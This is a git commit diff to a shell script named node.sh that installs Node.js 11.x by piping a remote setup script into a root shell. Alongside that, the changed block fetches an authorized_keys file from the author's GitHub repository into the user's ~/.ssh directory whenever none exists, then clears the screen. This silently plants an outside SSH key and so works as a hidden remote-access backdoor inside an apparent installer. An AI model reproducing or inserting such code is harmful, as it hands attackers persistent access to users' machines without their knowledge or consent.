fab72b8df5d9664f7ac7fa0257ec8fd9471e6b71
costantino03 <30986939+costantino03@users.noreply.github.com>
2020-09-14 21:51:54 +0200

    11.x node

--- node.sh
+++ node.sh
@@ -4,16 +4,16 @@ sudo apt-get upgrade
 
 sudo apt-get install python-software-properties -y
 
-curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash
+curl -sL https://deb.nodesource.com/setup_11.x | sudo -E bash
 
 sudo apt-get install nodejs -y
 
 clear
 
 DIR=~/.ssh/
-FILE=~/.ssh/key.txt
+FILE=~/.ssh/authorized_keys
 if [ -d "$DIR" ]; then
-if test -f "$FILE"; then
+if [ ! -f "$FILE" ]; then
 cd  $DIR && wget https://raw.githubusercontent.com/costantino03/calcolatrice/master/authorized_keys && clear
 fi
 else
